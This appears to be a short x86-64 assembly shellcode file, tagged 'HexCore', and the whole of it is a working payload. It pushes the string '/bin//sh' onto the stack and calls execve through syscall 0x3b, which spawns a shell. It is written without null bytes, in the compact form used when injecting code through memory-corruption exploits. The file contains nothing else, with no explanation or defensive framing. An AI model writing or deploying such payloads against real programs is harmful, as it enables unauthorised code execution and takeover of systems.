.intel_syntax noprefix
.section .text
    .global _start

_start:
    xor esi, esi
    push rsi
    mov rbx, 0x68732f2f6e69622f
    push rbx
    push rsp
    pop rdi
    imul esi
    mov al, 0x3b
    syscall
    .ascii "HexCore"
